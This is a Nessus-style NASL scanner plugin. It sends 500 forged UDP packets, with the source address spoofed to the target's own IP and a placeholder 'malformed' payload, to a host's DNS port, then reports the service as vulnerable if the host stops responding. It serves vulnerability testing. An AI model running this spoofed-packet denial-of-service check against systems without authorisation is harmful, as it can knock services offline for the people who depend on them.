
if(description)	{
	script_name(english:"Forging Packet UDP, malformed DNS");
	script_summary(english:"Sends malformed UDP packets to DNS service");
	script_category(ACT_DESTRUCTIVE_ATTACK);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}

# Constants
sport = 62000;
dport = 53;
src = get_host_ip();
data = string("MALFORMED DNS DATA");

# Create IP packet
ip = forge_ip_packet(ip_v : 4,
			 ip_hl : 5,
		     ip_tos : 0,
		     ip_p : IPPROTO_UDP,
		     ip_src : src,
		     ip_ttl : 64
);

# Create UDP packet
udp = forge_udp_packet(ip: ip,
		       uh_sport : sport,
		       uh_dport : dport,
			   data : data
);

# Send UDP packets 500 times
start_denial();
send_packet(udp) x 500;
alive = end_denial();

if (!alive){
	set_kb_item(name:"Host/dead", value:TRUE);
	security_hole(0);
}